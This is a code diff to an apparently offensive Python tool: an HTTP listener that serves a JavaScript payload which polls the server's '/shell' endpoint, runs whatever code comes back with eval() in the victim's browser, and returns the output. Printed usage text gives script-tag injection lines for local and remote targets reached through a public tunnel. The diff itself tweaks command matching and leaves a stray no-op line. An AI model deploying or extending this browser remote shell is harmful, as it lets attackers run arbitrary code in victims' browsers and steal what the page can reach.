@@ -39,13 +39,14 @@ class ChatHandler(http.server.SimpleHTTPRequestHandler):
             self.shell()
         elif self.path.startswith('/?command='):
             command = self.path[10:]
-            if command == 'get_script':
+            command
+            if command[:10] == 'get_script':
                 self.send_response(200)
                 self.send_header('Content-type', 'text/javascript')
                 self.end_headers()
                 payload = 'function fetchServer(){fetch("http://' + str(self.headers.get('Host')) + '/shell").then(e=>e.text()).then(data=>{var result=eval(data);fetch("http://' + str(self.headers.get('Host')) + '/shell?resp="+result)}).catch(e=>{console.error("Error fetching data from server:",e)}).finally(()=>{setTimeout(fetchServer, 1000);})}fetchServer();'
                 self.wfile.write(payload.encode())
-            elif command == 'get_html':
+            elif command[:8] == 'get_html':
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
@@ -144,12 +145,12 @@ if __name__ == '__main__':
 
 Local target:
 
-<script src="http://localhost:6969/?command=get_script"></script>
-The HTML payload: http://localhost:6969/?command=get_html
+<script src="http://localhost:6969/?command=get_script">
+The HTML payload: http://localhost:6969/
 
 Remote target:
 
-<script src="{http_tunnel.public_url}/?command=get_script"></script>
+<script src="{http_tunnel.public_url}/?command=get_script">
 The HTML payload: {http_tunnel.public_url}
 """)
         print(f"[+] Listener server started over WAN - {http_tunnel.public_url}")
